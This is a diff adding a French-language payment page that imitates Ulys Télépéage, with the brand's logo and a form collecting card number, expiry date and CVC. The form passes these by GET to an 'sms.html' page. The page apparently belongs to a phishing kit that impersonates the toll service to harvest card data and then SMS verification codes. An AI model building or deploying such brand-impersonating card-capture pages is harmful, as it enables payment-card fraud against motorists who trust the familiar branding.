@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paiement – Ulys Télépéage</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+</head>
+<body>
+  <header>
+    <img src="assets/images/logo-ulys.png" alt="Ulys"/>
+  </header>
+
+  <div class="container">
+    <h1>Choix du moyen de paiement</h1>
+    <form action="sms.html" method="get">
+      <label for="cb-num">Numéro de carte</label>
+      <input type="text" id="cb-num" name="cb-num" maxlength="19" required />
+
+      <label for="cb-date">Date d'expiration</label>
+      <input type="month" id="cb-date" name="cb-date" required />
+
+      <label for="cb-cvc">CVC</label>
+      <input type="text" id="cb-cvc" name="cb-cvc" maxlength="4" required />
+
+      <!-- Optionnel : Apple/Google Pay -->
+
+      <button type="submit">Valider le paiement</button>
+    </form>
+  </div>
+</body>
+</html>
